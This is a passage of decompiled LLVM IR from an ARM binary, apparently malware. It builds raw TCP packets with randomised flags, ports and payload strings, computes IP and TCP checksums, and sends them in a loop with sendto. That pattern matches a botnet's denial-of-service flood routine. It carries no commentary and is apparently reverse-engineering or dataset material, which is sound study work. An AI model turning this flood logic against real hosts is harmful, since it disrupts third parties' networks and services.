  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_9d3c, %bb79
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp104 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp104 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp83, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, 65535
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp86, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp87 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp88, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp105
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v5_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v6_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f78, { 1, 0 }
  uselistorder label %dec_label_pc_9f68, { 1, 0, 2 }
